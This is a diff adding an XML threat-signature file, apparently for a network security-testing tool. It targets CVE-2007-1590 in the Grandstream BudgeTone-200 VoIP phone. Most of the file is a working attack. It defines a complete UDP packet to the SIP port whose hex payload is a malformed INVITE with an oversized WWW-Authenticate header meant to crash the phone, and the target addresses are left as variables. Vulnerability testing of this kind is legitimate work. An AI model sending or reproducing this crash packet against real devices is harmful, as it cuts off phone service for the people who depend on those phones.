@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Grandstream Budge Tone-200 denial of service vulnerability "/>
+    <EngDesc display="true" value="This threat sends a malicious INVITE message to a Grandstream Budge Tone-200 VoIP phone causing it to crash. Grandstream Budge Tone-200 Phone uses the SIP protocol and typically listens on udp port 5060."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="SIP"/>
+    <Type_Of_Equipment display="true">
+      <item value="VoIP_Equipment"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Grandstream"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Grandstream_BudgeTone"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Grandstream_BudgeTone_200"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/3535"/>
+    <CVEID display="true" value="CVE-2007-1590"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="0d35b0fc4d8e4771ac34bd107c31bb05"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633101096722500000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1174930935" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="SIPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <UDP srcPort="@random(1025,65535)" destPort="$SIPdestPort" checksum="" length="" Payload="494E56495445207369703A5468726561744578403139322E3136382E3132372E313239205349502F322E300D0A5669613A205349502F322E302F554450203139322E3136382E312E323B6272616E63683D7A39684734624B30353661323765373B72706F72740D0A46726F6D3A203C7369703A74756375403139322E3136382E312E323E3B7461673D617330313164313138350D0A546F3A203C7369703A5468726561744578403139322E3136382E3132372E3132393E3B0D0A5757572D41757468656E7469636174653A2044696765737420646F6D61696E3D222F2D2B3A403D24254436243B243D3B3D243D242C40242E3D3B403B3B2C26262B3A3A3A3D402F3224263B362B3B2B3D2541353D3D3B403A3D3B24262541333A752C403D403B263B402B3A3A2B263B2B2C2C262F26403D2C3B3D263A262C3D263A3B3A3B3B4B2B26403D2544412A243B40262B263A3B2F3D3D2533373A2541363B2C402545442C3A3D3A402C3B2544413B262429242B3D3B2B3A254645243A403B263D2C573B2C672545463B2546423A2B404F242B2541462B3B2B3A2C263D2543412545413B242C402B2F3B402C2D3B3A3B2C5026403B5F243A254337262B262F212C254545243A2C403A3B3B4026402C2B2C7A40243B404024243A3A402F3D2C24332545443D402B2541452F3D26403B3B243B26242546453A403B242B3A24254542243D263A3B264B263B3A402545412C3D254241362532313B3D263A24220D0A435365713A203631303620494E564954450D4D61782D466F7277617264733A2037300D0A436F6E74656E742D4C656E6774683A20300D0A0D0A"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
